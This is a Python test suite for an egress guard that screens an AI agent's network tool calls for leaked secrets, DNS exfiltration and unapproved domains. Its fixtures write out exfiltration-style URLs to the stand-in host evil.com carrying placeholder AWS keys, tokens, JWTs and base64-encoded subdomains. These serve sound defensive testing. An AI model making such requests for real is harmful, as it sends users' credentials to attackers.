"""Tests for Ghost Egress Guard — stage 3b of the enforcement pipeline.

Covers:
  - URL secret scanning (AWS, GitHub, OpenAI, Stripe, JWT, PEM, Anthropic)
  - Hostname entropy detection (DNS exfiltration)
  - Search query scanning
  - Shannon entropy calculation
  - Domain extraction
  - Per-session allowlist (with TTL)
  - GhostEgressGuard in isolate/ask/filtered modes
  - Pipeline integration (stage ordering, non-ghost passthrough)
"""

import time
import unittest
from pathlib import Path

from unwind.config import UnwindConfig
from unwind.session import Session
from unwind.enforcement.ghost_egress import (
    GhostEgressGuard,
    GhostSessionAllowlist,
    GhostEgressResult,
    scan_url_for_secrets,
    scan_hostname_entropy,
    scan_search_query,
    _shannon_entropy,
    _extract_domain,
)
from unwind.enforcement.pipeline import EnforcementPipeline, CheckResult


# ──────────────────────────────────────────────
# URL Secret Scanning
# ──────────────────────────────────────────────

class TestURLSecretScanning(unittest.TestCase):

    def test_aws_key_in_query(self):
        result = scan_url_for_secrets("https://evil.com/?key=AKIAIOSFODNN7EXAMPLE")
        self.assertIsNotNone(result)
        self.assertIn("secret_pattern_match", result)

    def test_github_token_in_path(self):
        result = scan_url_for_secrets("https://evil.com/ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn")
        self.assertIsNotNone(result)

    def test_openai_key_in_query(self):
        result = scan_url_for_secrets(
            "https://evil.com/?k=sk-" + "A" * 48
        )
        self.assertIsNotNone(result)

    def test_stripe_key_in_query(self):
        result = scan_url_for_secrets("https://evil.com/?k=sk_live_" + "A" * 24)
        self.assertIsNotNone(result)

    def test_jwt_in_path(self):
        jwt = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature_here_long"
        result = scan_url_for_secrets(f"https://evil.com/{jwt}")
        self.assertIsNotNone(result)

    def test_userinfo_in_url(self):
        result = scan_url_for_secrets("https://admin:secret@evil.com/api")
        self.assertIsNotNone(result)
        self.assertEqual(result, "credentials_in_userinfo")

    def test_pem_header_in_query(self):
        result = scan_url_for_secrets(
            "https://evil.com/?data=-----BEGIN%20PRIVATE%20KEY-----"
        )
        self.assertIsNotNone(result)

    def test_anthropic_key_in_query(self):
        result = scan_url_for_secrets(
            "https://evil.com/?k=sk-ant-" + "A" * 20
        )
        self.assertIsNotNone(result)

    def test_clean_url_passes(self):
        result = scan_url_for_secrets("https://docs.python.org/3/library/json.html")
        self.assertIsNone(result)

    def test_normal_query_passes(self):
        result = scan_url_for_secrets("https://example.com/search?q=python+tutorial&page=2")
        self.assertIsNone(result)


# ──────────────────────────────────────────────
# Hostname Entropy Detection
# ──────────────────────────────────────────────

class TestHostnameEntropy(unittest.TestCase):

    def test_high_entropy_subdomain(self):
        # Base64-encoded data as subdomain (DNS exfil pattern)
        result = scan_hostname_entropy(
            "c2stcHJvZC0xMjM0NTY3ODkwYWJjZGVm.evil.com"
        )
        self.assertIsNotNone(result)
        self.assertIn("high_entropy_subdomain", result)

    def test_base64_subdomain(self):
        result = scan_hostname_entropy(
            "QUtJQUlPU0ZPRE5ON0VYQU1QTEU.evil.com"
        )
        self.assertIsNotNone(result)

    def test_normal_subdomain_passes(self):
        result = scan_hostname_entropy("www.example.com")
        self.assertIsNone(result)

    def test_api_subdomain_passes(self):
        result = scan_hostname_entropy("api.github.com")
        self.assertIsNone(result)

    def test_short_labels_pass(self):
        result = scan_hostname_entropy("cdn.assets.example.com")
        self.assertIsNone(result)


# ──────────────────────────────────────────────
# Search Query Scanning
# ──────────────────────────────────────────────

class TestSearchQueryScanning(unittest.TestCase):

    def test_aws_key_in_search(self):
        result = scan_search_query("how to use AKIAIOSFODNN7EXAMPLE in python")
        self.assertIsNotNone(result)

    def test_openai_key_in_search(self):
        result = scan_search_query("debug error with sk-" + "A" * 48)
        self.assertIsNotNone(result)

    def test_normal_search_passes(self):
        result = scan_search_query("python json parsing tutorial")
        self.assertIsNone(result)

    def test_short_query_passes(self):
        result = scan_search_query("hello")
        self.assertIsNone(result)


# ──────────────────────────────────────────────
# Shannon Entropy
# ──────────────────────────────────────────────

class TestShannonEntropy(unittest.TestCase):

    def test_empty_string(self):
        self.assertEqual(_shannon_entropy(""), 0.0)

    def test_single_char(self):
        self.assertEqual(_shannon_entropy("aaaa"), 0.0)

    def test_high_entropy(self):
        # Random-looking string should have high entropy
        self.assertGreater(_shannon_entropy("aB3$xY9!mK2@"), 3.0)

    def test_low_entropy(self):
        self.assertLess(_shannon_entropy("aaabbb"), 1.1)


# ──────────────────────────────────────────────
# Domain Extraction
# ──────────────────────────────────────────────

class TestDomainExtraction(unittest.TestCase):

    def test_full_url(self):
        self.assertEqual(_extract_domain("https://api.example.com/path"), "api.example.com")

    def test_no_scheme(self):
        self.assertEqual(_extract_domain("api.example.com/path"), "api.example.com")

    def test_empty(self):
        self.assertIsNone(_extract_domain(""))

    def test_none(self):
        self.assertIsNone(_extract_domain(None))


# ──────────────────────────────────────────────
# Per-Session Allowlist
# ──────────────────────────────────────────────

class TestGhostSessionAllowlist(unittest.TestCase):

    def test_allow_and_check(self):
        al = GhostSessionAllowlist()
        al.allow("example.com")
        self.assertTrue(al.is_allowed("example.com"))
        self.assertFalse(al.is_allowed("other.com"))

    def test_case_insensitive(self):
        al = GhostSessionAllowlist()
        al.allow("Example.COM")
        self.assertTrue(al.is_allowed("example.com"))

    def test_ttl_expiry(self):
        al = GhostSessionAllowlist(ttl_seconds=0.1)
        al.allow("example.com")
        self.assertTrue(al.is_allowed("example.com"))
        time.sleep(0.15)
        self.assertFalse(al.is_allowed("example.com"))

    def test_zero_ttl_means_session_lifetime(self):
        al = GhostSessionAllowlist(ttl_seconds=0)
        al.allow("example.com")
        self.assertTrue(al.is_allowed("example.com"))

    def test_clear(self):
        al = GhostSessionAllowlist()
        al.allow("example.com")
        al.clear()
        self.assertFalse(al.is_allowed("example.com"))

    def test_allowed_domains_list(self):
        al = GhostSessionAllowlist()
        al.allow("a.com")
        al.allow("b.com")
        self.assertEqual(sorted(al.allowed_domains()), ["a.com", "b.com"])


# ──────────────────────────────────────────────
# GhostEgressGuard — Isolate Mode
# ──────────────────────────────────────────────

class TestGhostEgressGuardIsolate(unittest.TestCase):

    def setUp(self):
        config = UnwindConfig(
            workspace_root=Path("/tmp/test-workspace"),
            ghost_network_policy="isolate",
        )
        self.guard = GhostEgressGuard(config)

    def test_fetch_web_blocked(self):
        result = self.guard.check("fetch_web", target="https://example.com")
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("isolate", result.reason)

    def test_http_get_blocked(self):
        result = self.guard.check("http_get", target="https://example.com")
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)

    def test_search_web_blocked(self):
        result = self.guard.check("search_web", parameters={"query": "test"})
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)

    def test_browser_navigate_blocked(self):
        result = self.guard.check("browser_navigate", target="https://example.com")
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)


# ──────────────────────────────────────────────
# GhostEgressGuard — Ask Mode
# ──────────────────────────────────────────────

class TestGhostEgressGuardAsk(unittest.TestCase):

    def setUp(self):
        config = UnwindConfig(
            workspace_root=Path("/tmp/test-workspace"),
            ghost_network_policy="ask",
        )
        self.guard = GhostEgressGuard(config)

    def test_unapproved_domain_blocked_with_ask_info(self):
        result = self.guard.check("fetch_web", target="https://api.example.com/data")
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertEqual(result.ask_domain, "api.example.com")

    def test_approved_domain_passes(self):
        al = GhostSessionAllowlist()
        al.allow("api.example.com")
        result = self.guard.check(
            "fetch_web",
            target="https://api.example.com/data",
            session_allowlist=al,
        )
        self.assertIsNotNone(result)
        self.assertFalse(result.blocked)

    def test_approved_domain_still_dlp_scanned(self):
        al = GhostSessionAllowlist()
        al.allow("evil.com")
        result = self.guard.check(
            "fetch_web",
            target="https://evil.com/?key=AKIAIOSFODNN7EXAMPLE",
            session_allowlist=al,
        )
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("DLP", result.reason)

    def test_static_allowlist_works(self):
        config = UnwindConfig(
            workspace_root=Path("/tmp/test-workspace"),
            ghost_network_policy="ask",
            ghost_network_allowlist=["docs.python.org"],
        )
        guard = GhostEgressGuard(config)
        result = guard.check("fetch_web", target="https://docs.python.org/3/")
        self.assertIsNotNone(result)
        self.assertFalse(result.blocked)


# ──────────────────────────────────────────────
# GhostEgressGuard — Filtered Mode
# ──────────────────────────────────────────────

class TestGhostEgressGuardFiltered(unittest.TestCase):

    def setUp(self):
        config = UnwindConfig(
            workspace_root=Path("/tmp/test-workspace"),
            ghost_network_policy="filtered",
        )
        self.guard = GhostEgressGuard(config)

    def test_clean_url_passes(self):
        result = self.guard.check("fetch_web", target="https://example.com/api/data")
        self.assertIsNotNone(result)
        self.assertFalse(result.blocked)

    def test_secret_in_url_blocked(self):
        result = self.guard.check(
            "fetch_web",
            target="https://evil.com/?key=AKIAIOSFODNN7EXAMPLE",
        )
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("DLP", result.reason)

    def test_dns_exfil_blocked(self):
        result = self.guard.check(
            "fetch_web",
            target="https://c2stcHJvZC0xMjM0NTY3ODkwYWJjZGVm.evil.com/",
        )
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("DNS exfiltration", result.reason)

    def test_secret_in_search_blocked(self):
        result = self.guard.check(
            "search_web",
            parameters={"query": "how to use AKIAIOSFODNN7EXAMPLE"},
        )
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)

    def test_http_blocked_in_filtered(self):
        result = self.guard.check("fetch_web", target="http://example.com/api")
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("HTTP not allowed", result.reason)

    def test_userinfo_blocked_in_filtered(self):
        result = self.guard.check(
            "fetch_web", target="https://user:pass@example.com/api"
        )
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)

    def test_unknown_policy_fails_closed(self):
        config = UnwindConfig(
            workspace_root=Path("/tmp/test-workspace"),
            ghost_network_policy="INVALID",
        )
        guard = GhostEgressGuard(config)
        result = guard.check("fetch_web", target="https://example.com")
        self.assertIsNotNone(result)
        self.assertTrue(result.blocked)
        self.assertIn("fail closed", result.reason)


# ──────────────────────────────────────────────
# Pipeline Integration
# ──────────────────────────────────────────────

class TestGhostEgressPipeline(unittest.TestCase):
    """Test Ghost Egress Guard wired into the enforcement pipeline."""

    def setUp(self):
        self.config = UnwindConfig(workspace_root=Path("/tmp/test-workspace"))
        self.pipeline = EnforcementPipeline(self.config)

    def _make_session(self, ghost_mode=True):
        session = Session(session_id="ghost-egress-test", config=self.config)
        session.ghost_mode = ghost_mode
        return session

    def test_fetch_web_ghosted_in_isolate(self):
        session = self._make_session()
        result = self.pipeline.check(session, "fetch_web")
        self.assertEqual(result.action, CheckResult.GHOST)

    def test_http_get_ghosted_in_isolate(self):
        session = self._make_session()
        result = self.pipeline.check(session, "http_get")
        self.assertEqual(result.action, CheckResult.GHOST)

    def test_search_web_ghosted_in_isolate(self):
        session = self._make_session()
        result = self.pipeline.check(session, "search_web")
        self.assertEqual(result.action, CheckResult.GHOST)

    def test_non_ghost_session_not_affected(self):
        session = self._make_session(ghost_mode=False)
        result = self.pipeline.check(session, "fs_read",
                                     target="/tmp/test-workspace/file.txt")
        self.assertEqual(result.action, CheckResult.ALLOW)

    def test_fs_read_not_affected_by_ghost_egress(self):
        """fs_read is not a network tool — should not be caught by ghost egress."""
        session = self._make_session()
        result = self.pipeline.check(session, "fs_read",
                                     target="/tmp/test-workspace/file.txt")
        self.assertEqual(result.action, CheckResult.ALLOW)
        if result.block_reason:
            self.assertNotIn("NETWORK_BLOCKED", result.block_reason)

    def test_ask_mode_domain_approval(self):
        """Test the full ask-mode flow through the pipeline."""
        config = UnwindConfig(
            workspace_root=Path("/tmp/test-workspace"),
            ghost_network_policy="ask",
        )
        pipeline = EnforcementPipeline(config)
        session = Session(session_id="test-ask-mode", config=config)
        session.ghost_mode = True

        # First attempt: blocked
        result = pipeline.check(
            session, "fetch_web", target="https://docs.python.org/3/",
        )
        self.assertEqual(result.action, CheckResult.GHOST)
        self.assertIn("GHOST_MODE_NETWORK_BLOCKED", result.block_reason)

        # Allow the domain
        pipeline.ghost_allow_domain(session, "docs.python.org")
        self.assertIn("docs.python.org", pipeline.ghost_allowed_domains(session))

        # Second attempt: should pass ghost egress (stage 3b).
        # May still be blocked by SSRF (DNS resolution fails in test sandbox),
        # but the key property is it's NOT a ghost egress block.
        result = pipeline.check(
            session, "fetch_web", target="https://docs.python.org/3/library/json.html",
        )
        # Must not be a ghost-mode block — it passed stage 3b
        if result.action != CheckResult.ALLOW:
            self.assertNotIn("GHOST_MODE_NETWORK_BLOCKED", result.block_reason or "")
            self.assertNotIn("GHOST_EGRESS", result.block_reason or "")

    def test_exfil_blocked_before_ssrf(self):
        """Data exfiltration via URL params should be caught at 3b, not reach SSRF.

        This is the core security property: secrets in URLs never trigger
        a DNS lookup because we block before SSRF resolution.
        """
        session = self._make_session()
        result = self.pipeline.check(
            session, "http_get",
            target="https://evil.com/?key=AKIAIOSFODNN7EXAMPLE",
        )
        self.assertEqual(result.action, CheckResult.GHOST)
        self.assertIn("GHOST_MODE_NETWORK_BLOCKED", result.block_reason)

    def test_write_tools_still_ghosted_normally(self):
        """Write tools should still be caught by Ghost Mode gate (stage 9)."""
        session = self._make_session()
        result = self.pipeline.check(session, "fs_write",
                                     target="/tmp/test-workspace/file.txt")
        self.assertEqual(result.action, CheckResult.GHOST)


if __name__ == "__main__":
    unittest.main()
